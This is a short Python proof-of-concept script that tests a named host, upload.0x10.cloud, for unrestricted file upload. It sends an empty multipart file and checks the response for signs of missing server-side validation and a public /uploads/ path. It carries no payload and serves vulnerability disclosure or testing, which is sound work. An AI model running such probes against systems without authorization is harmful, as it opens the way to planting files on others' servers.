"""
Author: Ghazaleh Azimikorf
Vulnerability: Unrestricted File Upload Due to Missing Server-Side Validation
Target: upload.0x10.cloud
"""

import urllib.request
import urllib.error
import uuid

target = "http://upload.0x10.cloud/"

# Send an empty file field to test whether the server validates uploads properly
filename = ""
file_content = b""

# Create multipart/form-data boundary
boundary = "----WebKitFormBoundary" + uuid.uuid4().hex

# Build request body using only Python standard library
body = []
body.append(f"--{boundary}\r\n".encode())
body.append(
    f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode()
)
body.append(b"Content-Type: application/octet-stream\r\n\r\n")
body.append(file_content)
body.append(b"\r\n")
body.append(f"--{boundary}--\r\n".encode())

data = b"".join(body)

request = urllib.request.Request(target, data=data, method="POST")
request.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
request.add_header("Content-Length", str(len(data)))

print("=" * 70)
print("Unrestricted File Upload Due to Missing Server-Side Validation")
print("=" * 70)

try:
    response = urllib.request.urlopen(request, timeout=10)
    html = response.read().decode("utf-8", errors="ignore")

    print("Target:", target)
    print("HTTP Status:", response.status)
    print()

    if "No file type restrictions applied" in html:
        print("VULNERABILITY FOUND: The upload feature does not enforce proper server-side validation.")
        print("The application reports a successful upload even when no meaningful file content is provided.")
    else:
        print("No explicit unrestricted upload message was detected.")

    if "/uploads/" in html:
        print("The server returned a web-accessible upload path under /uploads/.")

    print()
    print("Security Risk:")
    print("This behavior suggests that invalid, arbitrary, or unauthorized uploads")
    print("may be accepted and exposed through a public server directory.")

except urllib.error.HTTPError as e:
    print("HTTP Error:", e.code, e.reason)
except urllib.error.URLError as e:
    print("URL Error:", e.reason)
except Exception as e:
    print("Error:", e)